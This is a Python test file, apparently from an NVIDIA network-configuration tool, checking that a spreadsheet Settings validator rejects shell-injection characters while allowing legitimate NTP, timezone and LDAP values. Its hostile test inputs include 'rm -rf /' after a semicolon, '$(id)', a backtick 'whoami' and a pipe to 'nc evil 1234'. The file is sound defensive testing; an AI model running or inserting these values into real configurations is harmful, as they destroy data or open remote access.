# SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
# SPDX-License-Identifier: MIT
"""Validator coverage for the Settings shell-injection charset gate.

Added 2026-05-29 (security scan finding #1). Settings scalars like
ntp_servers / timezone / ldap_* are rendered *unquoted* into root-executed
NVUE config scripts. A hostile workbook could smuggle shell metacharacters
through them. validate_settings() rejects those at the import gate,
independent of any template-level quoting.

Newlines and commas are legitimate value separators (ntp_servers is one
host per line; ldap_servers is CSV; LDAP DNs use commas between RDNs), so
each token is validated individually rather than the separator being flagged.
"""
import sys
from pathlib import Path

import openpyxl

SCRIPTS_DIR = Path(__file__).parent.parent / "scripts"
if str(SCRIPTS_DIR) not in sys.path:
    sys.path.insert(0, str(SCRIPTS_DIR))

from validate_excel import validate_settings, ValidationResult


def _settings(pairs):
    """Build a Settings sheet from (key, value) pairs."""
    wb = openpyxl.Workbook()
    ws = wb.active
    ws.title = "Settings"
    ws.cell(row=1, column=1, value="Setting")
    ws.cell(row=1, column=2, value="Value")
    for r, (k, v) in enumerate(pairs, start=2):
        ws.cell(row=r, column=1, value=k)
        ws.cell(row=r, column=2, value=v)
    return ws


def _run(pairs):
    result = ValidationResult()
    validate_settings(_settings(pairs), result)
    return result


def _injection_errors(result):
    return [e for e in result.errors if "disallowed character" in e]


# ─── Hostile values are rejected ─────────────────────────────────────────

def test_ntp_semicolon_command_injection_blocked():
    result = _run([("ntp_servers", "pool.ntp.org; rm -rf /")])
    assert _injection_errors(result), result.errors


def test_timezone_command_substitution_blocked():
    result = _run([("timezone", "Etc/Zulu$(id)")])
    assert _injection_errors(result), result.errors


def test_ldap_base_dn_backtick_blocked():
    result = _run([("ldap_base_dn", "dc=x`whoami`,dc=com")])
    assert _injection_errors(result), result.errors


def test_pipe_metacharacter_blocked():
    result = _run([("ldap_domain", "example.com|nc evil 1234")])
    assert _injection_errors(result), result.errors


# ─── Legitimate values pass ──────────────────────────────────────────────

def test_multiline_ntp_servers_allowed():
    """ntp_servers is one host per line — the newline separator must not trip."""
    result = _run([("ntp_servers", "0.pool.ntp.org\n1.pool.ntp.org\n2.pool.ntp.org")])
    assert not _injection_errors(result), result.errors


def test_csv_ldap_servers_allowed():
    result = _run([("ldap_servers", "10.0.0.10,10.0.0.11")])
    assert not _injection_errors(result), result.errors


def test_ldap_dn_commas_allowed():
    result = _run([("ldap_root_dn", "cn=admin,dc=example,dc=com")])
    assert not _injection_errors(result), result.errors


def test_normal_timezone_allowed():
    result = _run([("timezone", "America/New_York")])
    assert not _injection_errors(result), result.errors
